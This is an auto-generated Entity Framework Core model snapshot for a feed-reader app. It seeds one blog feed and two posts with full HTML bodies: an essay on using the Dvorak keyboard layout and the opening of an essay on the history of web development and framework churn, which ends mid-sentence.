// <auto-generated />
using System;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Infrastructure;
using Microsoft.EntityFrameworkCore.Storage.ValueConversion;
using ThirdWay.Data;

#nullable disable

namespace ThirdWay.Data.Migrations
{
    [DbContext(typeof(ReaderContext))]
    partial class ReaderContextModelSnapshot : ModelSnapshot
    {
        protected override void BuildModel(ModelBuilder modelBuilder)
        {
#pragma warning disable 612, 618
            modelBuilder.HasAnnotation("ProductVersion", "8.0.1");

            modelBuilder.Entity("ThirdWay.Data.Model.Feed", b =>
                {
                    b.Property<int>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("INTEGER");

                    b.Property<string>("Author")
                        .IsRequired()
                        .HasMaxLength(255)
                        .HasColumnType("TEXT");

                    b.Property<string>("Description")
                        .IsRequired()
                        .HasMaxLength(255)
                        .HasColumnType("TEXT");

                    b.Property<DateTime>("LastUpdated")
                        .HasColumnType("TEXT");

                    b.Property<string>("Title")
                        .IsRequired()
                        .HasMaxLength(64)
                        .HasColumnType("TEXT");

                    b.Property<string>("Uri")
                        .IsRequired()
                        .HasMaxLength(512)
                        .HasColumnType("TEXT");

                    b.Property<string>("Url")
                        .IsRequired()
                        .HasMaxLength(1024)
                        .HasColumnType("TEXT");

                    b.HasKey("Id");

                    b.ToTable("Feed");

                    b.HasData(
                        new
                        {
                            Id = 1,
                            Author = "Michael",
                            Description = "Architecture, REST, Knowledge Graphs, etc.",
                            LastUpdated = new DateTime(2024, 2, 3, 11, 46, 10, 0, DateTimeKind.Local),
                            Title = "Sufficiently Advanced Technology",
                            Uri = "https://sufficiently-advanced.technology/feed.xml",
                            Url = "https://sufficiently-advanced.technology/"
                        });
                });

            modelBuilder.Entity("ThirdWay.Data.Model.Post", b =>
                {
                    b.Property<int>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("INTEGER");

                    b.Property<string>("Author")
                        .IsRequired()
                        .HasMaxLength(64)
                        .HasColumnType("TEXT");

                    b.Property<string>("Body")
                        .IsRequired()
                        .HasColumnType("TEXT");

                    b.Property<string>("Description")
                        .IsRequired()
                        .HasMaxLength(255)
                        .HasColumnType("TEXT");

                    b.Property<int>("FeedId")
                        .HasColumnType("INTEGER");

                    b.Property<string>("ImageUrl")
                        .IsRequired()
                        .HasMaxLength(255)
                        .HasColumnType("TEXT");

                    b.Property<bool>("IsDeleted")
                        .HasColumnType("INTEGER");

                    b.Property<bool>("IsFavorite")
                        .HasColumnType("INTEGER");

                    b.Property<bool>("IsRead")
                        .HasColumnType("INTEGER");

                    b.Property<DateTime>("LastUpdated")
                        .HasColumnType("TEXT");

                    b.Property<DateTime>("PublishDateTime")
                        .HasColumnType("TEXT");

                    b.Property<string>("Title")
                        .IsRequired()
                        .HasMaxLength(64)
                        .HasColumnType("TEXT");

                    b.Property<string>("Uri")
                        .IsRequired()
                        .HasMaxLength(1024)
                        .HasColumnType("TEXT");

                    b.HasKey("Id");

                    b.HasIndex("FeedId");

                    b.ToTable("Post");

                    b.HasData(
                        new
                        {
                            Id = 1,
                            Author = "Michael",
                            Body = "<figure class=\"aligncenter\"> <img property=\"image\" src=\"https://sufficiently-advanced.technology/assets/images/typewriter.jpg\" width=\"800\" height=\"300\" alt=\"old black &amp; white picture of an original underwood typewriter\" /> </figure> <p>I have now been typing using the <a href=\"https://en.wikipedia.org/wiki/Dvorak_keyboard_layout\">Dvorak keyboard layout</a> longer than I have used QWERTY. It’s been over 15 years since I first switched and probably a decade since I moved to the even more niche <a href=\"https://www.kaufmann.no/roland/dvorak/\">Programmer Dvorak Layout</a>. As the year winds down (and I am in currently in quarantine) I figure I’d take some of this idle time to write a little bit, and this is where my head is at today. Who knows, there may be some interesting take-aways from this. On the other hand, it may just be 1000-or-so words of “brain droppings” as George Carlin would say.</p> <!--more--> <h2 id=\"origins\">Origins</h2> <p>We love folklore, especially the apocryphal sort that makes for good, pithy tales of wisdom. The <a href=\"https://en.wikipedia.org/wiki/Space_Pen#Uses_in_the_U.S._and_Soviet_space_programs\">space pen vs pencil</a> urban legend is a great example. Right up there are the tales of the origin of the QWERTY keyboard layout. I have done a fair amount of research on this topic and cannot find any definitive proof that the origins of the layout were to “slow down typists” or to avoid the type hammers from colliding and becoming jammed. Another theory is that the layout was an early attempt at “vendor lock-in” so typists proficient with one brand would be likely to stay with that brand. Either way, we have long known the QWERTY layout is neither efficient nor ergonomically optimal.</p> <p>Neither Mario, nor Mavis Beacon taught me to type. I learned in the early 90s on IRC and telnet-based talkers. The pace of conversation on these channels meant my fingers had to learn how to keep up… and fast. By the time I first sat in an actual “typing class” in the mid-90s (do such things still exist?) I could already break 100WPM.</p> <p>By around 2007 I was approaching 20 years of my hands being mostly on keyboards and symptoms of RSI were beginning to set in. I had been vaguely aware of the Dvorak layout for awhile but never seriously looked at it until I saw several people claim that switching had eliminated their RSI issues. I didn’t relish the idea of wearing a wrist brace for the next 40 years, so I took the plunge.</p> <h2 id=\"the-innovation\">The Innovation</h2> <p>So the story goes, August Dvorak set out to deliberately design a better keyboard layout. His work began with a study of the physiology of the hands and frequency analysis of the English language. The work began with the goal of placing the most frequently used letters on the “home row” of the keyboard. This was further refined by analyzing digram (adjacent pairs of letters - e.g. st th nt etc.) frequency and optimizing the layout such that keystrokes would naturally alternate between hands maximizing typing parallelism where possible, and otherwise organizing common digrams such that they can be typed with a single hand with keystrokes moving from the pinky finger towards the index. If you attempt to drum your fingers on the table, you’ll probably notice that is is easier to drum in that direction (pinky-to-index) than the other way around.</p> <p>The net result was a keyboard that, in theory, allowed one to type faster, more accurately, and with less fatigue over time. The original Dvorak layout had the numeric characters in non-sequential order but the Dvorak layout we now know today is actually the simplified Dvorak layout.</p> <p><img src=\"/assets/images/layout-comparison.jpg\" alt=\"A side-by-side heatmap comparison between typing on a Dvorak keyboard and a qwerty keyboard\" /></p> <p>I’m a geek with a pro-innovation bias, so I chose to adopt the innovation.</p> <h2 id=\"retraining-my-brain\">Retraining My Brain</h2> <p>By this point, I had well over a decade of muscle memory hardwired into my digits and I knew the switch would not be an easy one. The challenge is compounded by the fact that, although I changed my keyboard map in my OS, the only physical keyboards I had access to all sported qwerty keycaps. I had hoped I could just reposition the keycaps but it turned out that the caps on different rows had slightly different shapes. Hunt-and-peck was not an option to make the switch but this was probably for the better.</p> <p>Memory is an interesting thing. For whatever reason, our memory is a write-on-read medium, meaning the act of recalling something from memory is what cements that memory in the future. We’re optimized to store that which we remember, and memories that are sufficiently infrequently accessed will eventually be garbage-collected. I needed a reference, however, so I printed out the layout and folded it into a make-shift table tent and placed the reference layout behind my keyboard.</p> <p>At first the experience was agonizing. Every key I intended to type required me to stop, try to remember where that key was now located on my keyboard, receive the mental equivalent to a cache-miss, and reference my cheat-sheet. This was–and I cannot emphasize this enough–extremely disruptive to my productivity. The act of typing became an endless stream of mental context-switches. The good news was that is was short-lived. By the end of the day, I could throw away my reference. By the end of the week, I could type at a modest 30 wpm. Keyboard shortcuts, it turned out, belonged to a different set of muscle memory that required separate training. I know many a dvorakian who use a custom layout that retains the usual ctrl-c ctrl-v etc. keyboard shortcuts in their original place.</p> <p>For the next couple of weeks, my typing speed slowly crept up back toward the 60wpm mark and soon I was typing faster than anyone else I knew. It’s just a shame that my brain–and not my fingers–was the bottleneck.</p> <p>Having spent some time in Dvorak keyboard communities, I soon learned about the programmer Dvorak layout - a set of modifications introduced to optimize the keyboard for those who type code for a living.</p> <p><img src=\"/assets/images/programmer_dvorak.png\" alt=\"The Programmer Dvorak Layout\" /></p> <p>Having tackled the truly monumental task of learning the core layout, the switch was largely incremental. With programmer Dvorak, common punctuation is shifted from the bottom row to the top row, special characters ([]{}()=*) are moved into more optimal positions on the numeric row and dominate, the numeric keys are in the shifted position (since, as programmers, one would assume we type parens and operators more often than magic numbers). Also, the numeric keypad is inverted but helpfully includes ABCDEF in the shifted position of 123456 respectively to make it very easy to type in hex values. In some ways, the change to the numeric row was harder.</p> <h2 id=\"looking-back---the-good-the-bad-the-ugly\">Looking Back - The Good, The Bad, The Ugly</h2> <h3 id=\"the-good\">The Good</h3> <p>Let’s start with the good. I have not had any RSI symptoms in 15 years. My wrists and hands are pain-free even after many long-days at the keyboard. Second, I can type <em>fast</em>, faster than any non-stenographer I know and, unfortunately, faster than I can think.</p> <p><img src=\"/assets/images/typing-test-results.jpg\" alt=\"Typing test results showing 140 wpm @ 100% accuracy\" /></p> <p>I also have some geek cred that I can flex from time to time. My ego likes this.</p> <p>One more good thing - it is <em>very</em> difficult to shoulder surf a password when I am typing. Security through obscurity, I know, but it is enough for someone to move on.</p> <h3 id=\"the-bad\">The Bad</h3> <p>At one point I had this fantasy that I would somehow become the keyboard equivalent of bilingual; that I could switch back and forth seamlessly at will. <em>It doesn’t work that way.</em> By the end of my retraining process, my neurons had irrevocably rewired. This also means that I can’t use anyone else’s computer effectively without first monkeying with the system settings (which is generally considered rude). Pairing and mobbing (where a single computer/keyboard is shared between two or more coders) becomes a problem with non-dvorakians. To prevent a lifetime ban in many coding mobs, I have a standing rule that every time I step out of the driver role, if I leave the layout on programmer dvorak I owe everyone involved a dollar per instance. This has cost me a lot of dollars.</p> <p>You can’t game effectively on dvorak. WASD wields far too much political capitol to be overturned. While some apps allow you to remap your keys, enough have been built assuming qwerty and you just have to switch layouts.</p> <p>In short, I pretty much have to keep dvorak and qwerty loaded at all times. My OS has a default key combo of ctrl-shift to cycle through layouts but my editors also use a lot of ctrl-shift-_something_ shortcuts that if I hesitate, the keyboard layout will shift on me alh ;fhhdlpt kja; g; ,jak Gzm ktglue (translation: “and suddenly this is what I’m typing.”)</p> <h3 id=\"the-ugly\">The Ugly</h3> <p>Because I use such a non-standard keyboard, my current home keyboard is a Das Keyboard Ultimate 4 (the one with the all-black keycaps). Since I touch-type anyway, I don’t need the incorrect labels… except when I do.</p> <p>Occasionally I find myself in a situation where I need that qwerty reference. Perhaps I am remoting into a vm or server that doesn’t have my layout setup yet and I need to type a password. Oh, and by the way, I often have no way to unmask the characters on that password box so I’m probably locking out my account. I’ve experience weird behavior using remote desktop tools as well, where characters double-convert (e.g. I type an H which is in the position of J on a QWERTY keyboard, which gets sent as a keystroke to the J position on the keyboard, which is a C on QWERTY) it’s weird and confusing. Also, I’ve been known to leave hanging remote desktop sessions running which somehow attach to the next person connecting and they can’t type anymore.</p> <p>Arguably the most irritating fact of the Dvorak layout is the placement of the ‘V’ key… right next to the ‘W’. That might seem innocuous at first, until you try to type ctrl-v (paste) and accidentally type ctrl-w (close window). This happens to me <em>daily.</em></p> <h2 id=\"conclusions\">Conclusions</h2> <p>Dvorak is an interesting case-study of the innovation-diffusion process. It’s interesting, however, because it is really a one-way decision. Discontinuation of the innovation is not a viable option. I’m not sure if this is good or bad. But, like vim and emacs devotees, I’m not sure I would want to go back.</p> <p>I’m also not entirely sold on programmer dvorak. Supposedly it was designed based on C, Java, Pascal, Lisp, HTML, CSS, and XML. For more terse languages (and regex) you really need the full spectrum of special characters and there just aren’t enough good spots. <code class=\"language-plaintext highlighter-rouge\">&amp;%$`^|@</code> are all in awkward places.</p> <p>At one point iOS added the dvorak layout although I don’t use it on my phone. It turns out that remains yet another set of muscle memory that would need to be retained. I tried it for about a day and learned that One-thumb typing is a terrible experience on a dvorak keyboard as you’re constantly jumping from side-to-side.</p> <p>All in all, I’m happy I made the switch as, if nothing else, my wrists don’t hurt anymore and I have some bragging rights. Would I recommend this to others? Only if you <em>really</em> wanted to.</p>",
                            Description = "I have now been typing using the Dvorak keyboard layout longer than I have used QWERTY. It’s been over 15 years since I first switched and probably a decade since I moved to the even more niche Programmer Dvorak Layout. As the year winds down (and I am in currently in quarantine) I figure I’d take some of this idle time to write a little bit, and this is where my head is at today. Who knows, there may be some interesting take-aways from this. On the other hand, it may just be 1000-or-so words of “brain droppings” as George Carlin would say. ",
                            FeedId = 1,
                            ImageUrl = "https://sufficiently-advanced.technology/assets/images/typewriter.jpg",
                            IsDeleted = false,
                            IsFavorite = false,
                            IsRead = false,
                            LastUpdated = new DateTime(2023, 12, 16, 17, 0, 0, 0, DateTimeKind.Local),
                            PublishDateTime = new DateTime(2023, 12, 16, 17, 0, 0, 0, DateTimeKind.Local),
                            Title = "Reflection an a Decade and a Half on Dvorak",
                            Uri = "https://sufficiently-advanced.technology/post/reflecting-on-dvorak"
                        },
                        new
                        {
                            Id = 2,
                            Author = "Michael",
                            Body = "<figure class=\"aligncenter\"> <img property=\"image\" src=\"https://sufficiently-advanced.technology/assets/images/htmx-meme.png\" width=\"800\" height=\"300\" alt=\"a timeline of the simplicity of web development in 2014, the complexity in 2019, and HTMX introducing a new simplicity in 2021\" /> </figure> <p>When I look back on my career in technology, I’ve been seduced, over and over again, by this idea that best practices exist and that I can consider my work “good” so long as I follow those best practices. In some ways it would be wonderful to work in a field where there are absolute “right” and “wrong” answers but I no longer believe software engineering is one of those fields. Every single decision we make has consequences and whether these consequences are positive, negative, or mixed will depend on the context. It’s all just a set of trade-offs, and the key to making good decisions lies in understanding what matters most and evaluating the trade-offs in this context.</p> <blockquote> <p>There are no best practices, only trade-offs.</p> <p>-First law of Software Architecture</p> </blockquote> <p>We’ve somehow gotten into this weird place in web development where the consensus seems to be that an absolute set of best practices exist; where the only meaningful decisions surround which framework to use and how to find the optimal implementation details within that chosen framework. Unfortunately the web development space has become so myopically focused on frameworks, tooling, and Single-Page Applications (SPAs) as the de-facto “best practices” that the trade-offs of these approaches are rarely discussed–or even well-understood up front–and, in many cases, the result is an ocean of bloat and accidental complexity that often could have been avoided entirely.</p> <!--more--> <p>It’s not that these client-side frameworks are necessarily “bad” in fact they certainly offer a great deal of value in the right place. Rather we need to continue to approach software development more mindfully, deliberately, and contextually. This remains a uniquely human skill that current AI models remain a long way off from materially competing with.</p> <p>My focus, for this series, is not to tell you how to build your next web app, or suggest you need to rewrite your existing one(s); instead I want to begin a conversation about web development framed in a broader context. I want to explore the trade-offs of framework-centric web development that are typically overlooked and introduce (or re-introduce) some ideas that might not yet be on your radar that may offer meaningful alternatives.</p> <h2 id=\"a-brief-history-of-the-web-and-web-development\">A Brief History of the Web and Web Development</h2> <p>Choosing the framework-centric web-development path is a significant and consequential decision; while there are many benefits to this approach–much can be gained–these benefits inevitably come at a cost. Is the cost justified? Sometimes. <em>It depends.</em></p> <p>The nature of trade-offs is that we are necessarily giving things up in exchange for what we gain. I can’t really speak to what we’ve lost without first talking about what we once had and how we got to where we are today.</p> <h3 id=\"it-started-with-information\">It Started With Information</h3> <p><img src=\"/assets/images/bush.png\" alt=\"Vannevar Bush\" /> (Vannevar Bush)</p> <p>Vannevar Bush was an engineer and inventor most active in the first half of the 1900s. In 1940, then President Franklin Roosevelt ordered the creation of the National Defense Research Council and named Bush as it’s chairperson. The agency’s stated goal was “to coordinate, supervise, and conduct scientific research on the problems underlying the development, production, and use of mechanisms and devices of warfare.” The 1940s was a period of explosive (no pun intended) growth of scientific information and Bush began to speculate that we had outgrown the existing mechanisms to catalog and organize this information.</p> <blockquote> <p>“…we can enormously extend the record; yet even in its present bulk we can hardly consult it… There may be millions of fine thoughts, and the account of the experience on which they are based… if the scholar can get at only one a week by diligent search, [their] syntheses are not likely to keep up with the current scene.”</p> <p>-Vannevar Bush</p> </blockquote> <p>Bush began to daydream about a radical new way to not only organize information, but connect and cross-link it. This culminated in his visionary 1945 Essay <a href=\"https://archive.org/details/as-we-may-think\">As We May Think</a> where he described a hypothetical machine that could both store and link documents and enable nonlinear navigation of these documents. This essay planted the ideas for what <a href=\"https://en.wikipedia.org/wiki/Ted_Nelson\">Ted Nelson</a> would later dub “hypertext” less than two decades later.</p> <p><img src=\"/assets/images/hypertext.png\" alt=\"Documents that are connected by hyperlinks\" /></p> <p>Hypertext was a revolutionary idea that spread among forward-thinking communities in the coming decades and inspired a young computer scientist named <a href=\"https://en.wikipedia.org/wiki/Tim_Berners-Lee\">Tim Berners-Lee</a> to build <a href=\"https://en.wikipedia.org/wiki/ENQUIRE\">ENQUIRE</a> at <a href=\"https://en.wikipedia.org/wiki/CERN\">CERN</a> in 1980, a hypertext system similar to today’s Wikis.</p> <h3 id=\"the-birth-of-the-web\">The Birth of the Web</h3> <p>By 1989, Tim Berners-Lee <a href=\"https://www.w3.org/History/1989/proposal.html\">proposed</a> a global hypertext system that would eventually be known as the World-Wide Web. In 1990, he began constructing the key components of a hypermedia system: A hypermedia (in this case, HTML), a network protocol (HTTP, the hypertext transfer protocol), a server presenting a hypermedia API which responds with hypermedia responses, and a client that can interpret the hypermedia (the first web browser). In August, 1991, <a href=\"https://info.cern.ch/hypertext/WWW/TheProject.html\">the very first web page</a> was published (notably, it’s still out there… and it still works).</p> <p>The web operated on a handful of key concepts. An <em>information resource</em> (e.g. a document, an image, a midi file, etc.), a <em>URL</em> (originally describing the location of the resource, but as the web made physical location increasingly irrelevant, the URL frequently acts as a mere <em>identifier</em> of the resource), <em>HyperText Markup Language</em> which would allow an author to describe the document in a standard way such that a html client to render the document for humans to view and interact with, while pulling in any additional embedded resources (e.g. images) and offered the first <em>hypermedia control;</em> the anchor tag. The anchor tag had an <code class=\"language-plaintext highlighter-rouge\">href</code> property enabling the linking of one resource to another; it’s what made the web “hyper.” These URLs, these <em>links</em> could be referenced, saved/bookmarked, embedded, and shared.</p> <p>During these formative years, resources on the web were largely static but there were plenty of classes of resources that would need to change independently of publishing cycles; <em>dynamic resources</em>. A notable early example of this phenomenon was a <a href=\"https://www.cs.cmu.edu/~coke/\">Coke Machine at Carnegie-Mellon University</a> which hosted its own web page allowing students to see if their beverage of choice was in stock (and ice-cold) without first having to walk across the campus. That same year, a draft of the <a href=\"https://en.wikipedia.org/wiki/Common_Gateway_Interface\">Common Gateway Interface</a> was created to standardize how command-line applications (such as the Perl interpreter or c programs) could be integrated with a web server. The need for input to these applications–not just output–led the specification of <a href=\"https://www.ietf.org/rfc/rfc1866.txt\">HTML 2.0</a> which included a second hypermedia control, the <code class=\"language-plaintext highlighter-rouge\">&lt;form&gt;</code> element along with a set of <code class=\"language-plaintext highlighter-rouge\">&lt;input&gt;</code> controls. The web was now truly interactive (at least, in a rudimentary sense). Clicking a link would load a new page in the browser window, and submitting a form would serialize the contents of the input tags, send those to the server, which would ultimately respond with a new html document to load in the browser window. Both interactions would completely replace the current contents of the browser window with a new web resource.</p> <h3 id=\"a-new-type-of-application\">A New Type of Application?</h3> <p>Most network applications of this era followed a relatively simple client/server architecture. The application, along with all it’s constituent business logic, rules, and instructions were compiled into a single “fat” client, installed locally on a PC while state existed in a shared database accessible over the network. This fat-client style application could offer a rich and responsive user experience, taking advantage of an available graphical user interface, dynamically updating only the parts of the user interface that truly needed to change; this approach had a significant drawback in how the application was distributed and updated. In effect, this application needed to be manually installed (or upgraded) on every machine on which it ran. Often a complex process of mastering, disk duplication, and distribution was involved; “ship it” literally meant <em>shipping it.</em> The core ideas of agile, embracing change and rapidly responding to it, weren’t just a fantasy; they were utterly impractical. With the advent of <a href=\"https://en.wikipedia.org/wiki/HyperCard\">HyperCard</a> several years earlier, we saw the potential of hypermedia applications. The web offered a tantalizing possibility of a new type of thin client, especially by 1995, when client-side scripting first appeared in <a href=\"https://en.wikipedia.org/wiki/Netscape_Navigator\">Netscape Navigator</a>.</p> <p>At this point, the architecture of the web truly took shape. Roy Fielding, one of the early architects of the web, would later dub the architecture of the web <a href=\"https://ics.uci.edu/~fielding/pubs/dissertation/fielding_dissertation.pdf\">“The REST Architectural Style”</a> defined by six constraints:</p> <ul> <li>The Client/Server Constraint</li> <li>The Stateless Constraint</li> <li>The Cache Constraint</li> <li>The Uniform Interface Constraint</li> <li>The Layered-System Constraint</li> <li>The (optional) Code-on-Demand Constraint</li> </ul> <p>Hypermedia is central to the Uniform Interface Constraint, where a server provides a hypermedia representation of a resource’s state along with a set of affordances in the form of hypermedia controls to allow a user to interact with that resource.</p> <p>The architecture of the web offered unprecedented flexibility and evolvability which enabled experimentation with different ways to build applications on the web. Since hypermedia offered a stable abstraction, many server-side scripting languages and server-runtimes were introduced which were immediately available to all existing web clients. While this opened the door to many new possibilities, the fact that every hypermedia interaction required a post-back and full-page refresh left much to be desired in the overall user experience (particularly on a dial-up connection).</p> <p>Attempts continued to build rich, client-side user experiences within web applications. One of the early attempts to overcome the limitation of a pull page reload on every request was <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frameset\">framesets</a>, first introduced inside Netscape 2.0 and lobbied to standardize this feature in <a href=\"https://web.archive.org/web/20071030083252/http://docs.rinet.ru/HTMLnya/ch13.htm\">HTML 3.0</a>. In effect, framesets enabled a single browser window to be divided (and, potentially further subdivided) into multiple independent pages which could be targeted and refreshed individually. They <a href=\"https://www.nngroup.com/articles/why-frames-suck-most-of-the-time/\">weren’t popular</a> and were subsequently <a href=\"https://html.com/frames/\">removed</a> in HTML 5 (although iFrames remain).</p> <p>Another approach was to extend html to allow embedding of applications into a web page. <a href=\"https://en.wikipedia.org/wiki/Java_applet\">Java Applets</a>, <a href=\"https://en.wikipedia.org/wiki/ActiveX\">ActiveX controls</a>, <a href=\"https://en.wikipedia.org/wiki/Adobe_Flash\">Flash</a>, <a href=\"https://en.wikipedia.org/wiki/Microsoft_Silverlight\">Silverlight</a>, and numerous others have come and gone. These approaches used the web as a delivery mechanism, but these apps weren’t native to the web and introduced performance, runtime, and security challenges.</p> <h3 id=\"enter-web-20\">Enter Web 2.0</h3> <p>By the late 1990s, Microsoft held a monopoly in the web browser space and they introduced the <a href=\"https://en.wikipedia.org/wiki/XMLHttpRequest\">XMLHttpRequest</a> object to allow their Outlook web client to perform some basic background tasks. It allowed them to moderately improve the UX of their webmail client and strengthen their monopoly. Outlook was widely used and this feature offered web users a superior user experience… but only in Internet Explorer. The other browser vendors followed suit, opening the door for the next revolution. <a href=\"https://en.wikipedia.org/wiki/Ajax_(programming)\">Ajax</a> and Web 2.0.</p> <p><img src=\"/assets/images/google-maps.gif\" alt=\"Ajax Powered Google Maps\" /> (Google Maps dynamic UI in action)</p> <p>Gmail and Google Maps were among the first web apps to show us the user experience we had been dreaming of for over a decade. Beyond mere background synchronization tasks, these apps were taking responses and rewriting parts of the page on the fly. It was a glorious hack, and not in the pejorative sense; like CMU’s internet Coke machine, or the first webcam <a href=\"https://en.wikipedia.org/wiki/Trojan_Room_coffee_pot\">created to remotely check if there was any coffee in the Trojan Room coffee pot</a> it was brilliant. The bar was raised and there was no going back.</p> <p><img src=\"/assets/images/coffee-cam.png\" alt=\"The Trojan Room Coffee Pot\" /> (the very first webcam)</p> <p>In the early days, working with XMLHttp objects and using browser native DOM manipulation APIs was not for the faint of heart. These APIs were not yet standardized, and the code quite verbose. A number of new JavaScript libraries popped up providing a browser agnostic API to simplify ajax requests, DOM tree traversal and manipulation, event handling, animations, etc. A new breed of web applications were built using <a href=\"https://en.wikipedia.org/wiki/YUI_Library\">YUI</a>, <a href=\"https://en.wikipedia.org/wiki/Ext_JS\">ext.js</a>, or <a href=\"https://en.wikipedia.org/wiki/JQuery\">jQuery</a> (to name but a few). This new paradigm was powerful, but began to erode the foundational ideas of hypermedia.</p> <h3 id=\"declining-hypermedia-and-a-new-ephemerality\">Declining Hypermedia and a New Ephemerality</h3> <p>By the late 00s, this became an increasingly common sight:</p> <div class=\"language-html highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>... <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">\"#\"</span> <span class=\"na\">id=</span><span class=\"s\">\"LoadUserPopup\"</span><span class=\"nt\">&gt;</span>label<span class=\"nt\">&lt;/a&gt;</span> ... </code></pre></div></div> <p>The anchor above is no longer a hypermedia control, just a user interface element. HTML was beginning a steady slide from <em>hypertext</em> markup language to mere <em>user-interface</em> markup language. Perhaps this was fine, after all the goal was to run and distribute interactive applications over the web. Did we really <em>need</em> hypermedia at this point or was HTML (as <em>UIML</em>) enough?</p> <p>As user interfaces became increasingly sophisticated, more and more work was being done inside the browser, dynamically generating and manipulating fragments of markup. The interactivity model was moving to the JavaScript libraries with an increasingly short half-life. While the flexibility and evolvability of the core architecture of the web and its supporting standards enabled this evolution, we arguably began to throw the baby out with the bathwater, coupling to very unstable and leaky abstractions.</p> <p>While the new ajax-powered era of web development promised applications that would feel modern, any projects that “backed the wrong horse” quickly felt positively antiquated. jQuery emerged as the dominant js library of this era. Apps built with YUI, ext.js, or the myriad others that weren’t rewritten for jQuery quickly showed their age and became harder to maintain due to abandoned plugins and declining developer interest.</p> <p>Also, as powerful as this approach was, the code was still very verbose, lacked structure, was difficult to test, difficult to debug, difficult to organize. We began to reach the limits of even the library-powered ajax approach.</p> <p>By 2009, client-side html templating started to emerge with libraries like <a href=\"https://en.wikipedia.org/wiki/Mustache_(template_system)\">mustache and handlebars</a> but these applications needed better structure and separation of concerns. In under a year, the <a href=\"https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller\">MVC</a>, <a href=\"https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel\">MVVM</a>, and <a href=\"https://en.wikipedia.org/wiki/Observer_pattern\">observer patterns</a> began to find their way to the client with <a href=\"https://en.wikipedia.org/wiki/AngularJS\">AngularJS</a>, <a href=\"https://en.wikipedia.org/wiki/Backbone.js\">Backbone.js</a>, and <a href=\"https://en.wikipedia.org/wiki/Knockout_(web_framework)\">Knockout</a> being among the leading contenders.</p> <p>The next hypertext domino to fall was the URL. In the quest to eliminate page refreshes at all costs, these new frameworks enabled the entire application to be downloaded into the browser at once and all internal application navigation was handled by custom, client-side code. We broke the back button and had to figure out how to reinvent it. Navigating directly to a “deep link” often resulted in incorrect application states. Again, we added more complexity to bring this basic behavior back. Increasingly navigating to an app would serve almost no html beyond what is necessary to bootstrap the application. We added more complexity in the form of prerendering and server-side rendering, again, to reinvent what we used to get for free.</p> <p>By it’s very nature, the web was a natively distributed system. A web page was often a composite of many resources which could be sourced from all over the web. These new client-side applications became large, unwieldly monoliths. It would take many years before the <a href=\"https://en.wikipedia.org/wiki/Microfrontend\">microfrontend</a> pattern would emerge to restore yet another feature of the web we had lost.</p> <h4 id=\"opting-in-to-tech-debt\">Opting In to Tech Debt</h4> <p>Applications built in the early ajax era began to suffer to shifting fashions. I personally saw one application rewritten four times in six years (ext.js -&gt; jQuery -&gt; knockout -&gt; angularJS) and worked with many applications that ultimately ended up using most (or all) of these simultaneously as trends would typically shift mid-rewrite. Of course, at this point, not only did the application need to be changed but so, too, did the entire toolchain. Gulp, Grunt, Webpack, SASS, LESS, Babel, Bazel… The list goes on an on. New framework versions often introduced some number of breaking changes, and an increasing amount of most organization’s development budget shifted from new features and innovation to simply keeping up with trends and applying the latest toolchain and runtime additions to fix what always existed until the latest framework “innovation.” Sections of the app dependent on an old version of a library or framework; or built using an abandoned toolchain or library we relegated to a growing mountain of tech debt.</p> <p>It soon became clear that coupling to any framework and toolchain was simply opting in to tech debt. If not today, than inevitably soon. Of course, the promise of stability was on the horizon.</p> <p>The consensus in the early 2010s was that the “smart-money” was on a framework that had the backing of the behemoth that is Google. AngularJS got a lot of attention and many web applications were irrevocably coupled to their particular brand of MVC/MVVM. In 2014, however, we learned that <a href=\"https://blog.dantup.com/2014/10/have-the-angular-team-lost-their-marbles/\">AngularJS was already on the sunset track</a> and brand new and completely different framework, confusingly called “Angular” was the future. Oh, and <em>drumroll…</em> <a href=\"https://web.archive.org/web/20150310040605/http://jaxenter.com/angular-2-0-announcement-backfires-112127.html\">there’s no upgrade path.</a> Admittedly that was walked back <em>slightly</em> following the backlash, but there’s no avoiding it… <em>another</em> rewrite was necessary.</p> <div class=\"youtube-wrapper\"> <iframe src=\"https://www.youtube.com/embed/Wm2h0cbvsw8\" allowfullscreen=\"\"></iframe> </div> <p>To be fair, the world changed on us very quickly, giving us little time to adapt or figure out the best way to proceed. The web dev space contains some of the brightest minds in the industry and many brilliant ideas have emerged during even the most turbulent framework years.</p> <p>Today we have largely coalesced around <a href=\"https://en.wikipedia.org/wiki/React_(software)\">React</a>, <a href=\"https://en.wikipedia.org/wiki/Angular_(web_framework)\">Angular</a>, and <a href=\"https://en.wikipedia.org/wiki/Vue.js\">Vue</a> with the best ideas of each (and the past) cross-pollinating to create a powerful set of tools to choose from. Although nobody is hopping from framework to framework quite like they did 15 years ago, these frameworks continue to regularly introduce breaking changes and every single one of them is a ticking time-bomb of tech-debt.</p> <h2 id=\"the-web-remains\">The Web Remains</h2> <p>This timeline, as I have framed it, might be offensive or, at a minimum, seem unfriendly to web framework apologists (assuming they haven’t stopped reading long ago). I write this not because I hate js frameworks (I don’t, they are extremely valuable, important, and certainly have their place). I write this because we have been frogs in the ever-heating water for so long; so preoccupied with keeping our skills current and our code up-to-date and secure that rarely do we have time for such retrospectives.</p> <p>Ultimately, we cannot deny the fact that there is no turning back from where we are. If you are building almost <em>anything</em> for the web today, there exists a minimum user experience expectation that can’t be escaped. We get this <em>out of the box</em> with any of the major frameworks. This approach has become regarded as the de-facto “best practice” and apparently the only game in town.</p> <p>It was a long and hard road to get where we are today. As bright and passionate developers over the past 20 years strove to deliver this dynamic UX and transform the web into a viable application platform, the history has been marked by reacting (again, no pun intended).</p> <p>Google Maps changed the game, and we <em>reacted</em> with ajax libraries that grew into frameworks. Despite what these libraries gave us, manually manipulating the DOM quickly grew unwieldly. We reacted with client-side templating frameworks and reacted again with MVC/MVVM frameworks to tackle the growing complexity of the explosion of client-side code. New client-side paradigms eclipsed the MVC/MVVM patterns and we reacted. The number of lines of code necessary just to build a “hello world” example has ballooned into the <em>millions.</em> Running <code class=\"language-plaintext highlighter-rouge\">$tokei node_modules</code> on a brand new <code class=\"language-plaintext highlighter-rouge\">create-react-app</code> in January, 2024 shows an astonishing <em>3,576,754 lines of code</em>. Bundles were getting out of 